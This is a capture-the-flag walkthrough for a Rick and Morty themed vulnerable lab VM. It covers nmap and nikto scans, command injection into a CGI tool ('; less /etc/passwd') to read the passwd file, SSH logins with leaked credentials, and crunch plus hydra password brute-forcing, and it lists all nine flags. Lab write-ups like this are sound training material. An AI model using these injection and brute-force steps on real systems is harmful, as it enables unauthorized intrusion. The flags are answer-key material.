Using nmap on the ip using SYN and version scan.

                └─$ sudo nmap -sV -sS -p- 192.168.42.92
                Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 15:28 IST
                Nmap scan report for 192.168.42.92
                Host is up (0.00050s latency).
                Not shown: 65528 closed tcp ports (reset)
                PORT      STATE SERVICE VERSION
                21/tcp    open  ftp     vsftpd 3.0.3
                22/tcp    open  ssh?
                80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
                9090/tcp  open  http    Cockpit web service 161 or earlier
                13337/tcp open  unknown
                22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
                60000/tcp open  unknown
                3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
                ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
                SF-Port22-TCP:V=7.93%I=7%D=5/17%Time=6464A558%P=x86_64-pc-linux-gnu%r(NULL
                SF:,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
                SF:\.0-31-generic\x20x86_64\)\n");
                ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
                SF-Port13337-TCP:V=7.93%I=7%D=5/17%Time=6464A558%P=x86_64-pc-linux-gnu%r(N
                SF:ULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
                ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
                SF-Port60000-TCP:V=7.93%I=7%D=5/17%Time=6464A55E%P=x86_64-pc-linux-gnu%r(N
                SF:ULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
                SF:\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20re
                SF:verse\x20shell\.\.\.\n#\x20");
                MAC Address: 08:00:27:B9:12:62 (Oracle VirtualBox virtual NIC)
                Device type: general purpose
                Running: Linux 3.X|4.X
                OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
                OS details: Linux 3.2 - 4.9
                Network Distance: 1 hop
                Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

                OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 43.42 seconds


Flag from fingerprint:
1.FLAG:{TheyFoundMyBackDoorMorty}


http interface flag 9090 flag:
2.FLAG {THERE IS NO ZEUS, IN YOUR FACE!}

ftp flag Users flag:
3.FLAG{Whoa this is unexpected}

Reverse shell using nc command in the port 60000
command:

    $nc <ip> 60000

reverse shell flag:
4.FLAG{Flip the pickle Morty!} - 10 Points


Busting the directories in the Morty's website using nikto
result:

      $ nikto -host http://192.168.42.8/ 
      - Nikto v2.5.0
      ---------------------------------------------------------------------------
      + Target IP:          192.168.42.8
      + Target Hostname:    192.168.42.8
      + Target Port:        80
      + Start Time:         2023-05-18 08:35:41 (GMT5.5)
      ---------------------------------------------------------------------------
      + Server: Apache/2.4.27 (Fedora)
      + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
      + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
      + Apache/2.4.27 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
      + OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
      + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
      + /passwords/: Directory indexing found.
      + /passwords/: This might be interesting.
      + /icons/: Directory indexing found.
      + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
      + 8908 requests: 0 error(s) and 9 item(s) reported on remote host
      + End Time:           2023-05-18 08:35:48 (GMT5.5) (7 seconds)
      ---------------------------------------------------------------------------
      + 1 host(s) tested

Opening the /passwords/ dir in the ip has a file FLAG.txt 
5.FLAG{Yeah d- just don't do it.} 

The directory also has a html file called passwords.html where it has a password commented on its html code
password: winter

Using robots.txt in the ip results:

      They're Robots Morty! It's ok to shoot them! They're just Robots!

      /cgi-bin/root_shell.cgi
      /cgi-bin/tracertool.cgi
      /cgi-bin/*
/cgi-bin/tracertool.cgi contains a command excecutable shell where we use the command:
      
      ; less /etc/passwd
to view the contents of passwd file which has the details of the usernames

Output:

      root:x:0:0:root:/root:/bin/bash
      bin:x:1:1:bin:/bin:/sbin/nologin
      daemon:x:2:2:daemon:/sbin:/sbin/nologin
      adm:x:3:4:adm:/var/adm:/sbin/nologin
      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
      sync:x:5:0:sync:/sbin:/bin/sync
      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
      halt:x:7:0:halt:/sbin:/sbin/halt
      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
      operator:x:11:0:operator:/root:/sbin/nologin
      games:x:12:100:games:/usr/games:/sbin/nologin
      ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
      nobody:x:99:99:Nobody:/:/sbin/nologin
      systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
      systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
      systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
      systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
      dbus:x:81:81:System message bus:/:/sbin/nologin
      polkitd:x:997:996:User for polkitd:/:/sbin/nologin
      sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
      rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
      abrt:x:173:173::/etc/abrt:/sbin/nologin
      cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
      rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
      chrony:x:995:993::/var/lib/chrony:/sbin/nologin
      tcpdump:x:72:72::/:/sbin/nologin
      RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
      Morty:x:1001:1001::/home/Morty:/bin/bash
      Summer:x:1002:1002::/home/Summer:/bin/bash
      apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
We can try the three usernames and the password winter with ssh
command:
  
      $ssh Summer@192.168.42.8 -p 22222

uname: Summer   pass: winter   satisfied!
Inside the Summer dir we have a FLAG.txt 

6.FLAG{Get off the high road Summer!} 





pass:Meeseek
zip:
7.FLAG: {131333}


safe flag:
8.FLAG{And Awwwaaaaayyyy we Go!} - 20 Points


safe hint:

      Ricks password hints:
       (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
      Follow these clues, in order


      1 uppercase character
      1 digit
      One of the words in my old bands name.  ---> Flesh Curtains

crunch the password list
crunch 7 7 ,%Flesh -O >>yourfile.txt
crunch 10 10 ,%Curtains -O>>Yourfile.txt


bruteforce using hydra
$ hydra -l RickSanchez -P yourfile.txt 192.168.42.8 ssh  -s  22222



flag root access:
9.FLAG: {Ionic Defibrillator} - 30 points



